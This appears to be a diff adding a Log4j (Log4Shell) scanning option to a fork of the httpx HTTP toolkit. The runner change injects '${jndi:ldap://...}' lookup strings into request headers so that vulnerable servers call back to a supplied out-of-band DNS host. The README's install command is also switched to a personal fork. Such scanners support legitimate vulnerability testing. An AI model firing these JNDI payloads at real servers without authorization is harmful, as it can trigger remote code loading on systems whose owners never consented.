@@ -1,0 +1,150 @@
+diff --git a/README.md b/README.md
+index 668ae42..807f730 100644
+--- a/README.md
++++ b/README.md
+@@ -62,7 +62,7 @@ httpx is a fast and multi-purpose HTTP toolkit allow to run multiple probers usi
+ httpx requires **go1.17** to install successfully. Run the following command to get the repo - 
+ 
+ ```sh
+-go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
++go install -v github.com/sahruldotid/httpx/cmd/httpx@latest
+ ```
+ 
+ # Usage
+@@ -126,6 +126,7 @@ MISCELLANEOUS:
+    -p, -ports string[]  Port to scan (nmap syntax: eg 1,2-10,11)
+    -path string         File or comma separated paths to request
+    -paths string        File or comma separated paths to request (deprecated)
++   -dns4j string		Perform Log4j scan using given dns string, eg randomstring.interact.sh.
+ 
+ OUTPUT:
+    -o, -output string                File to write output
+diff --git a/common/httpx/httpx.go b/common/httpx/httpx.go
+index b7c84d2..6ef6501 100644
+--- a/common/httpx/httpx.go
++++ b/common/httpx/httpx.go
+@@ -299,6 +299,7 @@ func (h *HTTPX) NewRequest(method, targetURL string) (req *retryablehttp.Request
+ 	return h.NewRequestWithContext(context.Background(), method, targetURL)
+ }
+ 
++
+ // NewRequest from url
+ func (h *HTTPX) NewRequestWithContext(ctx context.Context, method, targetURL string) (req *retryablehttp.Request, err error) {
+ 	req, err = retryablehttp.NewRequestWithContext(ctx, method, targetURL, nil)
+@@ -316,6 +317,7 @@ func (h *HTTPX) NewRequestWithContext(ctx context.Context, method, targetURL str
+ 	return
+ }
+ 
++
+ // SetCustomHeaders on the provided request
+ func (h *HTTPX) SetCustomHeaders(r *retryablehttp.Request, headers map[string]string) {
+ 	for name, value := range headers {
+diff --git a/common/httpx/option.go b/common/httpx/option.go
+index 46d6070..a6c5077 100644
+--- a/common/httpx/option.go
++++ b/common/httpx/option.go
+@@ -36,6 +36,7 @@ type Options struct {
+ 	MaxResponseBodySizeToSave int64
+ 	MaxResponseBodySizeToRead int64
+ 	UnsafeURI                 string
++	DNS4J					  string
+ }
+ 
+ // DefaultOptions contains the default options
+diff --git a/runner/options.go b/runner/options.go
+index 8bb3347..fca25d5 100644
+--- a/runner/options.go
++++ b/runner/options.go
+@@ -196,6 +196,8 @@ type Options struct {
+ 	Stream                    bool
+ 	SkipDedupe                bool
+ 	ProbeAllIPS               bool
++	DNS4J				  	  string
++	CustomDNS4J				  string
+ }
+ 
+ // ParseOptions parses the command line options for application
+@@ -257,6 +259,8 @@ func ParseOptions() *Options {
+ 		flagSet.VarP(&options.CustomPorts, "ports", "p", "Port to scan (nmap syntax: eg 1,2-10,11)"),
+ 		flagSet.StringVar(&options.RequestURIs, "path", "", "File or comma separated paths to request"),
+ 		flagSet.StringVar(&options.RequestURIs, "paths", "", "File or comma separated paths to request (deprecated)"),
++		flagSet.StringVar(&options.DNS4J, "dns4j", "", "DNS address to log log4j exploit"),
++
+ 	)
+ 
+ 	createGroup(flagSet, "output", "Output",
+diff --git a/runner/runner.go b/runner/runner.go
+index 1536102..b13b288 100644
+--- a/runner/runner.go
++++ b/runner/runner.go
+@@ -10,6 +10,7 @@ import (
+ 	"encoding/json"
+ 	"fmt"
+ 	"io/ioutil"
++	"log"
+ 	"net"
+ 	"net/http"
+ 	"net/http/httputil"
+@@ -95,6 +96,7 @@ func New(options *Options) (*Runner, error) {
+ 	httpxOptions.UnsafeURI = options.RequestURI
+ 	httpxOptions.CdnCheck = options.OutputCDN
+ 	httpxOptions.ExcludeCdn = options.ExcludeCDN
++	httpxOptions.DNS4J = options.DNS4J
+ 	if options.CustomHeaders.Has("User-Agent:") {
+ 		httpxOptions.RandomAgent = false
+ 	} else {
+@@ -634,6 +636,7 @@ func (r *Runner) RunEnumeration() {
+ 	wgoutput.Wait()
+ }
+ 
++// t is target (hostname from user input)
+ func (r *Runner) process(t string, wg *sizedwaitgroup.SizedWaitGroup, hp *httpx.HTTPX, protocol string, scanopts *scanOptions, output chan Result) {
+ 	protocols := []string{protocol}
+ 	if scanopts.NoFallback || protocol == httpx.HTTPandHTTPS {
+@@ -768,6 +771,7 @@ retry:
+ 		customHost = parts[1]
+ 	}
+ 	URL, err := urlutil.Parse(domain)
++
+ 	if err != nil {
+ 		return Result{URL: domain, Input: origInput, err: err}
+ 	}
+@@ -808,9 +812,12 @@ retry:
+ 		customHost = URL.Host
+ 		ctx := context.WithValue(context.Background(), "ip", customIP) //nolint
+ 		req, err = hp.NewRequestWithContext(ctx, method, URL.String())
++
+ 	} else {
+ 		req, err = hp.NewRequest(method, URL.String())
++
+ 	}
++
+ 	if err != nil {
+ 		return Result{URL: URL.String(), Input: origInput, err: err}
+ 	}
+@@ -819,6 +826,25 @@ retry:
+ 		req.Host = customHost
+ 	}
+ 
++	// DNS4J Exploit, maybee need more improvement
++	if hp.Options.DNS4J != "" {
++		head, err := os.Open("Log4Header.txt")
++		if err != nil {
++			gologger.Fatal().Msgf("No input provided: %s", err)
++		}
++		defer head.Close()
++		scanner := bufio.NewScanner(head)
++		numLines := 0
++		for scanner.Scan() {
++			hp.CustomHeaders[scanner.Text()] = fmt.Sprintf("${jndi:ldap://%s/a}", strings.Replace(hp.Options.DNS4J, "REPLACEME", URL.Host + strconv.Itoa(numLines), 1))
++			numLines++
++		}
++		if err := scanner.Err(); err != nil {
++			log.Fatal(err)
++		}
++
++	}
++
+ 	hp.SetCustomHeaders(req, hp.CustomHeaders)
+ 	// We set content-length even if zero to allow net/http to follow 307/308 redirects (it fails on unknown size)
+ 	if scanopts.RequestBody != "" {
